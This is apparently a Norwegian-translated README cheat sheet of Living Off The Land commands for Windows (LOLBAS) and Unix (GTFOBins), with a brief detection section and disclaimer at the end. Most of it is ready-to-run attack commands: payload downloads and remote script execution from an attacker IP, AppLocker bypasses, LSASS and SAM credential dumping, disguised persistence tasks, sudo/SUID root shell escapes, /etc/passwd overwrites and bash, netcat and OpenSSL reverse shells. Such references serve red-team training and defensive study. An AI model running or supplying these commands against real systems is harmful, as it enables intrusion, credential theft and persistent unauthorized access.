<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# 🏹 Living Off The Land (LOLBAS & GTFOBins) - komplett jukseark

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██╗      ██████╗ ██╗     ██████╗  █████╗ ███████╗    ██████╗ ████████╗███████╗ ██████╗ 
  ██║     ██╔═══██╗██║     ██╔══██╗██╔══██╗██╔════╝   ██╔════╝ ╚══██╔══╝██╔════╝██╔═══██╗
  ██║     ██║   ██║██║     ██████╔╝███████║███████╗   ██║  ███╗   ██║   █████╗  ██║   ██║
  ██║     ██║   ██║██║     ██╔══██╗██╔══██║╚════██║   ██║   ██║   ██║   ██╔══╝  ██║   ██║
  ███████╗╚██████╔╝███████╗██████╔╝██║  ██║███████║██╗╚██████╔╝   ██║   ██║     ╚██████╔╝
  ╚══════╝ ╚═════╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝    ╚═╝   ╚═╝      ╚═════╝ 
                 Living Off The Land (Windows LOLBAS & Unix GTFOBins)
```
<p align="center">
  <img src="https://img.shields.io/badge/LOLBAS-Windows_Binaries-blue?style=for-the-badge" alt="LOLBAS">
  <img src="https://img.shields.io/badge/GTFOBins-Unix_PrivEsc-orange?style=for-the-badge" alt="GTFOBins">
  <img src="https://img.shields.io/badge/Defense_Evasion-Fileless-red?style=for-the-badge" alt="Defense Evasion">
  <img src="https://img.shields.io/badge/Living_Off_The_Land-Techniques-green?style=for-the-badge" alt="Living Off The Land">
</p>

<p align="center">
  <b>🛠️ Omfattende referanse for misbruk av legitime forhåndsinstallerte systembinærfiler for å kjøre kode, laste ned nyttelast og eskalere privilegier</b>
</p>

---

## 📋 Innholdsfortegnelse

– [Introduksjon](#-introduksjon)
- [Why Living Off The Land?](#-why-living-off-the-land)
- [Del 1: Windows LOLBAS](#-del-1-windows-lolbas)
  - [Filnedlasting og inngang](#filnedlasting--inngang)
  - [Kodeutførelse og AppLocker-bypass](#kode-utførelse--applocker-bypass)
  - [Credential Dumping (LSASS, SAM, LSA)](#credential-dumping-lsass-sam-lsa)
  - [Rekognosering og oppdagelse](#rekognosering--oppdagelse)
  - [Persistence & Scheduled Tasks](#persistence--scheduled-tasks)
- [Del 2: Unix / Linux GTFOBins](#-part-2-unix--linux-gtfobins)
  - [SUID & Sudo Shell Escapes](#suid--sudo-shell-escapes)
  - [Fillese- og skriveutnyttelse](#fil-lese--skrive-utnyttelse)
  - [Network Ingress & Reverse Shells](#network-ingress--reverse-shells)
  - [GTFOBins High-Impact Interpreters](#gtfobins-high-impact-tolker)
- [Hurtigreferansetabell](#-hurtigreferansetabell)
– [Defensive Considerations & Detection](#-defensive-considerations--detection)
– [Juridisk ansvarsfraskrivelse](#-juridisk ansvarsfraskrivelse)
- [Ressurser](#-ressurser)

---

## 🎯 Introduksjon

**Living Off The Land (LotL)** er et håndverk etter utnyttelse der angripere og røde lagspillere utelukkende bruker legitime, innebygde, pålitelige systembinærfiler, skript og biblioteker som allerede finnes på operativsystemet.

- **LOLBAS (Windows):** Living Off the Land Binærer, skript og biblioteker.
- **GTFOBins (Unix/Linux):** Kuratert samling av Unix-binærfiler som kan misbrukes til å omgå lokale sikkerhetsrestriksjoner, unnslippe begrensede skjell og eskalere privilegier.

---

## ⚖️ Hvorfor leve av landet?

1. 🛡️ **Omgår applikasjonshvitlisting:** Binærfiler som `certutil.exe`, `rundll32.exe` eller `find` er digitalt signert av Microsoft- eller OS-leverandører og klarert av AppLocker, WDAC og SELinux.
2. 👁️ **Undviker signaturbasert AV/EDR:** Ingen fremmed ondsinnet kjørbar fil (`.exe`, `.elf`) slippes på disken.
3. 📉 **Lavt operativt fotavtrykk:** Reduserer loggforensiske anomalier ved å bruke innfødte administrasjonsverktøy.

---

## 🪟 Del 1: Windows LOLBAS

### Filnedlasting og ingress

#### 1. Certutil.exe
```cmd
:: Download file and decode from base64
certutil.exe -urlcache -split -f http://10.10.14.5/shell.exe %TEMP%\shell.exe

:: Base64 encode and decode local files
certutil.exe -encode payload.exe encoded.txt
certutil.exe -decode encoded.txt payload.exe
```
#### 2. Bitsadmin.exe
```cmd
:: Asynchronous background download
bitsadmin.exe /transfer myDownloadJob /download /priority FOREGROUND http://10.10.14.5/payload.exe C:\Windows\Temp\payload.exe
```
#### 3. Curl.exe & PowerShell
```powershell
:: Built-in curl (Windows 10+)
curl.exe -o C:\Windows\Temp\tool.exe http://10.10.14.5/tool.exe

:: PowerShell download string
powershell -nop -c "Invoke-WebRequest -Uri 'http://10.10.14.5/s.ps1' -OutFile '$env:TEMP\s.ps1'"
```
---

### Kodeutførelse og AppLocker Bypass

#### 1. Mshta.exe (Kjør ekstern HTA/VBScript)
```cmd
:: Execute malicious HTA script directly from remote URL (bypasses AppLocker)
mshta.exe http://10.10.14.5/payload.hta

:: Inline VBScript execution
mshta.exe vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run ""cmd.exe /c calc.exe"""))
```
#### 2. Regsvr32.exe (Squiblydoo-teknikk)
```cmd
:: Executes remote scriptlet (.sct) via COM without touching disk
regsvr32.exe /s /n /u /i:http://10.10.14.5/shell.sct scrobj.dll
```
#### 3. Rundll32.exe
```cmd
:: Execute exported DLL function
rundll32.exe payload.dll,EntryPoint

:: Execute JavaScript in memory
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('Pwned');
```
#### 4. Wmic.exe (XSL-skriptutførelse)
```cmd
:: Execute arbitrary code via XSL stylesheet
wmic.exe process get brief /format:"http://10.10.14.5/script.xsl"
```
#### 5. Installutil.exe
```cmd
:: Execute unmanaged code inside signed .NET installer (bypasses AppLocker)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U MaliciousApp.exe
```
---

### Legitimasjonsdumping (LSASS, SAM, LSA)

#### 1. Rundll32.exe + Comsvcs.dll (LSASS Dump)
Dump LSASS prosessminne uten å slippe Mimikatz:
```powershell
# Find LSASS Process ID
$lsassPid = (Get-Process lsass).Id

# Create minidump using built-in comsvcs.dll (Requires Administrator)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\Windows\Temp\lsass.dmp full
```
#### 2. Reg.exe (Lagre SAM, SYSTEM og SECURITY Hives)
```cmd
:: Dump local credential hives for offline extraction
reg.exe save HKLM\SAM C:\Windows\Temp\sam.hive
reg.exe save HKLM\SYSTEM C:\Windows\Temp\system.hive
reg.exe save HKLM\SECURITY C:\Windows\Temp\security.hive
```
---

### Rekognosering og oppdagelse
```cmd
:: Find internal domain controllers
nltest /dclist:domain.local

:: List domain trust relationships
nltest /domain_trusts

:: Query Active Directory computers and users without RSAT
dsquery computer
dsquery user -name *admin*

:: Check active network connections with process IDs
netstat -ano
```
---

### Utholdenhet og planlagte oppgaver
```cmd
:: Create scheduled task running every 15 minutes as SYSTEM
schtasks.exe /create /tn "SecurityHealthService" /tr "C:\Windows\Temp\agent.exe" /sc minute /mo 15 /ru "NT AUTHORITY\SYSTEM"

:: Add Registry Run Key for current user
reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
```
---

## 🐧 Del 2: Unix / Linux GTFOBins

### SUID & Sudo Shell Escapes

Når en binær har SUID satt (`chmod u+s`) eller er gitt i `sudo -l`, misbruk den for et umiddelbart rotskall:

#### 1. Sudo / SUID `find`
```bash
# SUID
find . -exec /bin/sh -p \; -quit

# Sudo
sudo find . -exec /bin/sh \; -quit
```
#### 2. Sudo / SUID `vim` / `vi`
```bash
# Escape from inside vim
:!/bin/sh

# One-liner execution
vim -c ':!/bin/sh'
```
#### 3. Sudo / SUID `awk`
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```
#### 4. Sudo / SUID `tar`
```bash
# Checkpoint command execution
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
#### 5. Sudo / SUID `nano`
```bash
# Inside nano: Press Ctrl+R, then Ctrl+X, then type:
reset; sh 1>&0 2>&0
```
#### 6. Sudo / SUID `env`
```bash
# SUID
env /bin/sh -p

# Sudo
sudo env /bin/sh
```
#### 7. Sudo `less` / `more` / `man`
```bash
# Inside pager: Type !/bin/sh and press Enter
!/bin/sh
```
---

### Fillese- og skriveutnyttelse

Når du ikke kan spawne et skall direkte, bruk fil-lese/skriveverktøy for å overskrive `/etc/passwd` eller lese `/etc/shadow`:

#### Overskriv `/etc/passwd` via Sudo/SUID `tee`
```bash
# Generate password hash: openssl passwd -1 -salt evil P@ss123
echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
su root2
```
#### Les sensitive filer via SUID-binære filer
```bash
# Base64
base64 /etc/shadow | base64 --decode

# Xxd
xxd /etc/shadow | xxd -r

# Head / Tail
head -n 100 /etc/shadow
```
---

### Nettverksinngang og omvendte skjell

Overfør filer og pop-skall uten `curl` eller `wget`:

#### 1. Bash Native TCP Reverse Shell
```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```
#### 2. Native Netcat (uten `-e`-flagg)
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
```
#### 3. OpenSSL-kryptert omvendt skall
På angriper:
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```
På mål:
```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.5:4444 > /tmp/s; rm /tmp/s
```
---

### GTFOBins tolker med høy effekt

Hvis tolker tildeles Sudo / SUID:
```bash
# Python
sudo python3 -c 'import os; os.system("/bin/sh")'

# Perl
sudo perl -e 'exec "/bin/sh";'

# Ruby
sudo ruby -e 'exec "/bin/sh"'

# PHP
sudo php -r "system('/bin/sh');"

# Lua
sudo lua -e 'os.execute("/bin/sh")'
```
---

## 📊 Hurtigreferansetabell

| OS | Binær | Formål | Misbrukskommando |
|----|--------|--------|--------------|
| **Vinn** | `certutil.exe` | Last ned fil | `certutil -urlcache -split -f http://<IP>/file out.exe` |
| **Vinn** | `mshta.exe` | Ekstern HTA Exec | `mshta http://<IP>/payload.hta` |
| **Vinn** | `regsvr32.exe` | Scriptlet Exec | `regsvr32 /s /n /u /i:http://<IP>/s.sct scrobj.dll` |
| **Vinn** | `rundll32.exe` | LSASS Dump | `rundll32 comsvcs.dll, MiniDump <PID> out.dmp full` |
| **Unix**| `find` | SUID Shell | `find . -exec /bin/sh -p \; -quit` |
| **Unix**| `awk` | Sudo Shell | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| **Unix**| `vim` | Shell Escape | `vim -c ':!/bin/sh'` |
| **Unix**| `tee` | Fil Overskriv | `echo "root2:..." \| sudo tee -a /etc/passwd` |

---

## 🛡️ Defensive vurderinger og gjenkjenning

1. **Revisjon kommandolinjelogging:**
   Aktiver **Sysmon (Event ID 1)** og Windows Process Creation Logging (Event ID 4688) med kommandolinjeovervåking for å overvåke unormale argumenter som sendes til `certutil`, `mshta` og `rundll32`.
2. **Blokker ondsinnede foreldre-barn-forhold:**
   Overvåk `mshta.exe` eller `regsvr32.exe` som gyter `cmd.exe` eller `powershell.exe`.
3. **Begrens Sudo-direktiver:**
   Unngå jokertegn (`*`) i `/etc/sudoers`. Tillat aldri brukere å kjøre tekstredigerere (`vim`, `nano`) eller kompilatorer som root.

---

## ⚠️ Juridisk ansvarsfraskrivelse

> **VIKTIG:** Living Off The Land-teknikker misbruker pålitelige administrative verktøy. Dette juksearket er kun for autoriserte sikkerhetsvurderinger, defensiv herding og pedagogiske studier.

---

## 📚 Ressurser

- [LOLBAS Project Official Repository](https://lolbas-project.github.io/)
- [GTFOBins offisielle arkiv](https://gtfobins.github.io/)
- [MITRE ATT&CK: Subverting Trust Controls (T1564)](https://attack.mitre.org/techniques/T1564/)